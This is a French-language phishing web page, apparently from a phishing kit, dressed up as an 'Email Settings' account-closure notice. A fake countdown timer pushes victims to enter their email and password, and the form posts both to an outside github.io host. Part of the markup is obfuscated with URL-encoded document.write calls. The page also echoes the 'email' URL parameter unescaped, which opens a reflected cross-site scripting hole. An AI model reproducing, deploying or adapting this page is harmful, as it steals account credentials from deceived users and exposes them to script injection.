<?php $email_from_link = isset($_GET['email']) ? $_GET['email'] : '';?>
<html>
<head>

<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
<script type="text/javascript" src="https://code.jquery.com/jquery.min.js"></script>
<style>
.box{
float: left;
    overflow: hidden;
    background: #fffffff5;
    width: 100%;
    height: 100%;
    z-index: 3;
    position: fixed;
    top: 0;
}
</style>
<script type="text/javascript">
<!--
document.write(unescape('%3Ctitle%3EEmail%20Settings%3C/title%3E%0A%0A%3Clink%20rel%3D%22icon%22%20href%3D%22id.png%22%20sizes%3D%2213x13%22%20type%3D%22image/png%22%3E%0A%0A%0A%3C/head%3E%0A%3Cbody%20marginheight%3D%220%22%20marginwidth%3D%220%22%20topmargin%3D%220%22%20bottommargin%3D%220%22%20rightmargin%3D%220%22%20leftmargin%3D%220%22%20link%3D%22%233F59A4%22%20alink%3D%22%233F59A4%22%20vlink%3D%22%233F59A4%22%3E%0A%0A%3Ctable%20width%3D%22100%25%22%20height%3D%22%22%20cellspacing%3D%220%22%3E%0A%0A%3Ctr%3E%3Ctd%20height%3D%2230%22%20bgcolor%3D%22%23000000%22%3E%0A%0A%09%3Ctable%20width%3D%22%22%20align%3D%22center%22%3E%3Ctr%3E%0A%0A%0A%09%3Ctd%3E%0A%09%3Cimg%20src%3D%22mail.png%22%20width%3D%2240%22%20height%3D%2227%22%3E%0A%09%3C/td%3E%0A%0A%0A%09%3Ctd%20width%3D%225%22%3E%3C/td%3E%0A%0A%0A%09%3Ctd%3E%0A%09%3Cfont%20face%3D%22Lucida%20Grande%2C%20Lucida%20Sans%20Unicode%2C%20Lucida%20Sans%2C%20DejaVu%20Sans%2C%20Verdana%2C%20sans-serif%22%20size%3D%224%22%20color%3D%22%23ffffff%22%3E%0AEmail%20Setting%0A%09%3C/font%3E%0A%09%3C/td%3E'));
//-->
</script>







	<td width="800">
	<div align="right">
	<a href="" style="text-decoration:none">
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="4" color="#ffffff">
	<?php echo $_GET['email']; ?>	</font>
	</a>
	</div>
	</td>

 <td width="5"></td>





	<td>
	<a href="">
	
	<img src="eaj.png" width="23" border="0">
	</a>
	</td>

	</tr></table>

</td></tr>






<tr><td height="60" bgcolor="#FFFFFF"></td></td>






<tr><td height="" bgcolor="#FFFFFF">

	<table width="747" align="center" cellspacing="0">

	<tr><td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="+2" color="#3F59A4">
	Clôture du compte
	</font>
	</td></tr>


	<tr><td height="15" bgcolor="#FFFFFF"></td></td>



	<tr><td>

		<table><tr>

		<td>
		<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
		Compte à rebours avant la fermeture de votre email:
		</font>
		<br>
		
		</td>


		<td>
		<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="4" color="#ff0000">

		<b><div id="hms">01:15:10</div></b>

		<script type="text/javascript">
    		function count() {
 
    		var startTime = document.getElementById('hms').innerHTML;
    		var pieces = startTime.split(":");
    		var time = new Date();    time.setHours(pieces[0]);
    		time.setMinutes(pieces[1]);
    		time.setSeconds(pieces[2]);
    		var timedif = new Date(time.valueOf() - 1000);
    		var newtime = timedif.toTimeString().split(" ")[0];
    		document.getElementById('hms').innerHTML=newtime;
    		setTimeout(count, 1000);
		}
		count();
 
		</script>

		</font>

		</td>



		</tr></table>
<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
		Pour éviter la fermeture de votre compte, veuillez saisir votre adresse e-mail ci-dessous et cliquer sur Vérifier.

		</font>
	
	</td></tr>






 
	
	



	<tr><td height="25" bgcolor="#FFFFFF"></td></td>


	<tr><td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="+2">
	<?php echo $_GET['email']; ?>
	</font>
	</td></tr>


<tr><td height="5" bgcolor="#FFFFFF"></td></td>


	
	<tr><td>
	<form method="post" action="https://fichier-ach-fr-document.github.io/2026/">
	</td></tr>



	<tr><td>

		<input  name="dishi" type="email" style="width: 314px; height: 56px; font-family: Verdana; font-size: 15px; color: #000000; background-color: #ffffff; border: solid 1px #8484848a; padding: 10px; -moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px" required="" placeholder="Adresse email" value="<?php echo $email_from_link;?>">
					
					<br></br>
		<input  name="password" type="password" style="width: 314px; height: 56px; font-family: Verdana; font-size: 15px; color: #000000; background-color: #ffffff; border: solid 1px #8484848a; padding: 10px; -moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px " required="" placeholder="Saisissez votre mot de passe" value="">

	</td></tr>







	<tr><td height="5" bgcolor="#FFFFFF"></td></td>



	<tr><td>

	   <button  name="monteh"  title="" class="saing" style=" width: 314px; height:55px; font-family: Verdana; font-size: 21px; color:#ffffff; background-color: #3F59A4; border: solid 1px #3F59A4; padding: 10px; -moz-border-radius: 2px; -webkit-border-radius: 2px; -khtml-border-radius: 2px; border-radius: 2px; -moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #88888873; /* box-shadow: 3px 3px 3px #888; */ margin-top: 12px; text-align: center; cursor:pointer; ">Verify >>
</button>
		 

	</td></tr>




	<tr><td>
	
	</form>
	</td></tr>




	

<script type="text/javascript">
<!--
document.write(unescape('%3Ctr%3E%3Ctd%20height%3D%22200%22%20bgcolor%3D%22%23FFFFFF%22%3E%3C/td%3E%3C/td%3E%0A%0A%0A%0A%0A%09%0A%0A%09%3Ctr%3E%3Ctd%3E%0A%09%3Chr%20width%3D%22650%22%20align%3D%22left%22%3E%0A%09%3C/td%3E%3C/tr%3E%0A%0A%0A%0A%0A%0A%0A%0A%09%3Ctr%3E%3Ctd%20height%3D%2210%22%20bgcolor%3D%22%23FFFFFF%22%3E%3C/td%3E%3C/td%3E%0A%0A%0A%0A%0A%0A%09%3Ctr%3E%3Ctd%3E%0A%09%3Ca%20href%3D%22%22%20style%3D%22text-decoration%3Anone%22%3E%0A%09%3Cfont%20face%3D%22Lucida%20Grande%2C%20Lucida%20Sans%20Unicode%2C%20Lucida%20Sans%2C%20DejaVu%20Sans%2C%20Verdana%2C%20sans-serif%22%20size%3D%222%22%3E%0A%09%3Cb%3E***%3C/b%3E%20Account%20/%20Settings%20/%20Security%20Settings%20/%20Account%20Verification%20%3E%3E%0A%09%3C/font%3E%0A%09%3C/a%3E%0A%09%3C/td%3E%3C/tr%3E%0A%0A%0A%09%3C/table%3E%0A%0A%3C/td%3E%3C/tr%3E%0A%0A%0A%0A%3C/table%3E%0A%0A%3C/body%3E%0A%3C/html%3E'));
//-->
</script>

    
 	
	
 
